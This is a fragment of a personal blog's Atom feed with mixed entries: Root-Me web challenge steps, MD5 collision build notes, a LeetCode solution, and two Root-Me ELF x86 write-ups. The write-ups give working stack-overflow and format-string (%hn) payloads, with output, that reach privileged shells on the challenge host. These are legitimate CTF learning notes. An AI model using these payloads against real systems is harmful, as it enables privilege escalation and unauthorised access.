class="built_in">hash</span>.htm</span><br><span class="line">3. Construct the url like this and press enter: http://challenge01.root-me.org/web-serveur/ch52/?url=##DOMAIN##&amp;h=##HASH##</span><br><span class="line"><span class="number">4.</span> When new page <span class="keyword">is</span> loading, you can see the flag, stop the redirection pressing escape <span class="keyword">and</span> copy it.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Weak-password&quot;&gt;&lt;a href=&quot;#Weak-password&quot; class=&quot;headerlink&quot; title=&quot;Weak password&quot;&gt;&lt;/a&gt;Weak password&lt;/h1&gt;&lt;h2 id=&quot;tNikto&quot;&gt;&lt;a href=&quot;#tNikto&quot; class=&quot;headerlink&quot; title=&quot;tNikto&quot;&gt;&lt;/a&gt;tNikto&lt;/h2&gt;&lt;p&gt;Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nikto -host http://challenge01.root-me.org/web-serveur/ch3/&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web-server in root me" scheme="http://finsenty54.github.io/categories/web-server-in-root-me/"/>
    
    
    <category term="web" scheme="http://finsenty54.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>md5快速碰撞</title>
    <link href="http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/"/>
    <id>http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/</id>
    <published>2020-12-17T11:31:08.000Z</published>
    <updated>2020-12-17T11:45:13.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="md5快速碰撞"><a href="#md5快速碰撞" class="headerlink" title="md5快速碰撞"></a>md5快速碰撞</h1><p><a href="https://github.com/Finsenty54/fast_collision">https://github.com/Finsenty54/fast_collision</a></p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><p><a href="https://www.runoob.com/w3cnote/cpp-header.html">https://www.runoob.com/w3cnote/cpp-header.html</a><br>C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成<code>目标文件</code>后再与其他的目标文件做一次<code>链接</code>（link）就行了。</p><a id="more"></a><h3 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h3><h3 id="boost安装"><a href="#boost安装" class="headerlink" title="boost安装"></a>boost安装</h3><p><code>./b2 install </code>后</p><p>执行<code>sudo ldconfig</code><br>运行程序后就能加载共享库</p><p><em>程序运行结果</em></p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/essay!!!!!!!!!!/hash_collision/fast_collision]└──╼ $./first_try Generating first block: ........ 6.637388s wall, 6.620000s user + 0.000000s system = 6.620000s CPU (99.7%)</code></pre><hr><h3 id="查找后缀文件"><a href="#查找后缀文件" class="headerlink" title="查找后缀文件"></a>查找后缀文件</h3><pre><code>find -name &quot;*.txt&quot; | xargs rmxargs --helpUsage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</code></pre><hr><pre><code>find ./ -regextype posix-extended -regex &quot;.*\.(txt|bin)&quot; </code></pre><h3 id="vscodium调试"><a href="#vscodium调试" class="headerlink" title="vscodium调试"></a>vscodium调试</h3><p>注意在调试时需要在<code>makefile</code>文件中配置好debug（方法参考2.使用命令行调试大型程序部分），否则无法标记断点。</p><p><code>在生成对象文件时加 -g</code></p><h3 id="parrot-os安装中文输入法"><a href="#parrot-os安装中文输入法" class="headerlink" title="parrot os安装中文输入法"></a>parrot os安装中文输入法</h3><p><a href="https://parrotsec-cn.org/t/ibus-rime/3950">https://parrotsec-cn.org/t/ibus-rime/3950</a><br>ibus-rime</p><h3 id="函数常数是数组"><a href="#函数常数是数组" class="headerlink" title="函数常数是数组"></a>函数常数是数组</h3><p>C++ 传数组给一个函数，数组类型自动转换为指针类型，因而传的实际是地址。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;md5快速碰撞&quot;&gt;&lt;a href=&quot;#md5快速碰撞&quot; class=&quot;headerlink&quot; title=&quot;md5快速碰撞&quot;&gt;&lt;/a&gt;md5快速碰撞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Finsenty54/fast_collision&quot;&gt;https://github.com/Finsenty54/fast_collision&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C++&quot;&gt;&lt;/a&gt;C++&lt;/h2&gt;&lt;h3 id=&quot;头文件&quot;&gt;&lt;a href=&quot;#头文件&quot; class=&quot;headerlink&quot; title=&quot;头文件&quot;&gt;&lt;/a&gt;头文件&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/w3cnote/cpp-header.html&quot;&gt;https://www.runoob.com/w3cnote/cpp-header.html&lt;/a&gt;&lt;br&gt;C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成&lt;code&gt;目标文件&lt;/code&gt;后再与其他的目标文件做一次&lt;code&gt;链接&lt;/code&gt;（link）就行了。&lt;/p&gt;</summary>
    
    
    
    <category term="HASH" scheme="http://finsenty54.github.io/categories/HASH/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode longest_substring_without_repeating_characters</title>
    <link href="http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/"/>
    <id>http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/</id>
    <published>2020-12-11T08:49:29.000Z</published>
    <updated>2020-12-11T08:51:36.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="longest-substring-without-repeating-characters"><a href="#longest-substring-without-repeating-characters" class="headerlink" title="longest_substring_without_repeating_characters"></a>longest_substring_without_repeating_characters</h2><p>这题用到了哈希表 和 滑动窗口</p><p>滑动窗口：<br>就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量</p><p>哈希表：<br>哈希表存着目前最长子组的值-地址对</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Solution::lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> begin=<span class="number">0</span>,end=<span class="number">0</span>,begin_new=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; windows;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.size(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//windows.insert(make_pair(s[i],i));</span></span><br><span class="line">        <span class="keyword">if</span>(windows.count(s[end])==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//有重复值，那么获得目前的最大值</span></span><br><span class="line">            <span class="keyword">if</span> (end-begin&gt;count || count==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count=end-begin;</span><br><span class="line">            &#125;</span><br><span class="line">            begin_new=windows[s[end]]+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//delete </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = begin; i &lt; begin_new; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                windows.erase(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//插入新的重复值</span></span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">            begin=begin_new;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end-begin&gt;count)</span><br><span class="line">    &#123;</span><br><span class="line">        count=end-begin;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> count;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/rAyOUO"><img src="https://s3.ax1x.com/2020/12/11/rAyOUO.jpg" alt="rAyOUO.jpg"></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;longest-substring-without-repeating-characters&quot;&gt;&lt;a href=&quot;#longest-substring-without-repeating-characters&quot; class=&quot;headerlink&quot; title=&quot;longest_substring_without_repeating_characters&quot;&gt;&lt;/a&gt;longest_substring_without_repeating_characters&lt;/h2&gt;&lt;p&gt;这题用到了哈希表 和 滑动窗口&lt;/p&gt;
&lt;p&gt;滑动窗口：&lt;br&gt;就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量&lt;/p&gt;
&lt;p&gt;哈希表：&lt;br&gt;哈希表存着目前最长子组的值-地址对&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 3</title>
    <link href="http://finsenty54.github.io/2020/12/11/Stack_buffer_overflow_basic_3/"/>
    <id>http://finsenty54.github.io/2020/12/11/Stack_buffer_overflow_basic_3/</id>
    <published>2020-12-11T07:21:28.000Z</published>
    <updated>2020-12-11T07:23:47.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-3"><a href="#ELF-x86-Stack-buffer-overflow-basic-3" class="headerlink" title="ELF x86 - Stack buffer overflow basic 3"></a>ELF x86 - Stack buffer overflow basic 3</h2><a id="more"></a><p>参考:: <a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">int</span> check;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(count &gt;= <span class="number">64</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oh no...Sorry !\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(check == <span class="number">0xbffffabc</span>)</span><br><span class="line">        shell();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            read(fileno(<span class="built_in">stdin</span>),&amp;i,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">switch</span>(i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">                  count--;</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  buffer[count] = i;</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setreuid(geteuid(), geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>0x0804866a &lt;+116&gt;:   cmp    DWORD PTR [ebp-0x50],0xbffffabc</code></p><p>如果<code>  buffer[count]</code> 指向 check的地址， 那么<code>buffer[count] = i</code>就可以把输入值赋给check<br>将count减为-4，buffer[-4]就相当于buffer地址减去4</p><pre><code>app-systeme-ch16@challenge02:~$ (python -c &#39;print &quot;\x08&quot;*4+&quot;\xbc\xfa\xff\xbf&quot;&#39;;cat )| ./ch16Enter your name: iduid=1216(app-systeme-ch16-cracked) gid=1116(app-systeme-ch16) groups=1116(app-systeme-ch16),100(users)cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Stack-buffer-overflow-basic-3&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-3&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 3&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 3&lt;/h2&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Format string bug basic 2</title>
    <link href="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/"/>
    <id>http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/</id>
    <published>2020-11-29T12:25:46.000Z</published>
    <updated>2020-11-29T12:28:56.901Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr><h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>— prints into a <code>string</code> with length checking<br>(<a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。<br>·如果n为零，则不写任何内容，而s可以为空指针。<br>·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。<br><em>也就是增加了限制</em></p><a id="more"></a><hr><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>是一个字符串，以其初始移位状态（如果有）开始和结束。<br>format由零个或多个<code>指令</code>组成：<code>普通字符</code>（简单地<code>复制到输出流</code>中）和<code>转换规范</code>，每个转换规范都将导致获取零个或多个<code>参数</code>。<br>·如果format的参数不足，则结果不确定</p><hr><h3 id="％n"><a href="#％n" class="headerlink" title="％n $"></a>％n $</h3><p>·可以将<code>转换</code>应用于参数列表中格式之后的第n个参数，而不是下一个未使用的参数。<br>·在这种情况下，转换说明符字符％（请参见下文）由序列“％n $”代替，其中n是[1，{NL_ARGMAX}]范围内的十进制整数，给出了参数在参数中的位置。</p><hr><p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p><hr><h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  参数应该是一个指向整数的指针，到目前为止，通过对fprintf（）函数之一的调用，将写入输出的<code>字节数</code></p><hr><p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p><hr><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure><hr><h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; echo;done)check at 0xbffffae8argv[1] = [%1$08x]fmt=[080485f1]check=0x4030201check at 0xbffffae8argv[1] = [%2$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%3$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%4$08x]fmt=[000000c2]check=0x4030201check at 0xbffffae8argv[1] = [%5$08x]fmt=[bffffc34]check=0x4030201check at 0xbffffae8argv[1] = [%6$08x]fmt=[b7fe1439]check=0x4030201check at 0xbffffae8argv[1] = [%7$08x]fmt=[f63d4e2e]check=0x4030201check at 0xbffffae8argv[1] = [%8$08x]fmt=[04030201]check=0x4030201check at 0xbffffae8argv[1] = [%9$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%10$08x]fmt=[00000000]check=0x4030201</code></pre><p>第<code>8</code>处存着<code>check</code></p><hr><pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)check at 0xbffffae8argv[1] = [AAAA%8$08x]fmt=[AAAA04030201]check=0x4030201check at 0xbffffae8argv[1] = [AAAA%9$08x]fmt=[AAAA41414141]check=0x4030201check at 0xbffffae8argv[1] = [ABCD%8$08x]fmt=[ABCD04030201]check=0x4030201check at 0xbffffae8argv[1] = [ABCD%9$08x]fmt=[ABCD44434241]check=0x4030201</code></pre><p>输入值在第九处(小端序)<br>check 在第八处</p><hr><h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p><pre><code>%n          一次性写入 4 个字节%hn         一次性写入 2 个字节%hhn        一次性写入 1 个字节</code></pre><p>./a.out “$(python -c ‘import sys; sys.stdout.write(“CAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hn”)’)”<br><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p><p><del>printf (“\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|”);</del></p><p><del>./format_2 $(python2 -c ‘print “\xd8\xfa\xff\xbf%9$08s”‘)</del></p><hr><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x&quot;&#39;)&quot;check at 0xbffffae8argv[1] = [Øúÿ¿%9$x]fmt=[Øúÿ¿bffffad8]check=0x4030201app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s&quot;&#39;)&quot;check at 0xbffffae8argv[1] = [Øúÿ¿%9$s]fmt=[Øúÿ¿Â]check=0x4030201</code></pre><hr><p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>第九处写\xbeef 48879-8<br>第十处写\xdead 8126(已经输出了48879)</p><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)check at 0xbffffac8argv[1] = [Èúÿ¿Êúÿ¿%48871x%9$hn%8126x%10$hn]fmt=[Èúÿ¿Êúÿ¿                                                    ]check=0xdeadbeefYeah dude ! You win !app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Format-string-bug-basic-2&quot;&gt;&lt;a href=&quot;#ELF-x86-Format-string-bug-basic-2&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Format string bug basic 2&quot;&gt;&lt;/a&gt;ELF x86 - Format string bug basic 2&lt;/h2&gt;&lt;hr&gt;
